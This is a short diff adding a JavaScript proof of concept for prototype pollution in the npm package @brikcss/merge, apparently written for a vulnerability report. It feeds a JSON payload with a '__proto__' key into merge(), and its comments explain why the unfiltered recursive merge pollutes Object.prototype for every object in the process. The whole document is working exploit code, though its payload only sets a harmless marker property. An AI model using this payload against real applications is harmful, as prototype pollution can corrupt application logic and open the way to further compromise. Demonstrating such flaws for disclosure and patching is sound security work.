@@ -1,0 +1,16 @@
+```javascript
+const merge = require("./node_modules/@brikcss/merge");
+
+// Malicious payload targeting Object.prototype via __proto__ key.
+// merge() dispatches into the recursive object-merge routine, which
+// copies keys from the source onto the target without filtering
+// "__proto__"/"constructor"/"prototype", so nested paths reach
+// function t (the internal type/path helper invoked during the walk)
+// and the assignment pollutes the global Object.prototype.
+const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
+
+merge({}, payload);
+
+// Every plain object in the process is now polluted.
+console.log("polluted:", ({}).polluted); // -> "yes"
+```
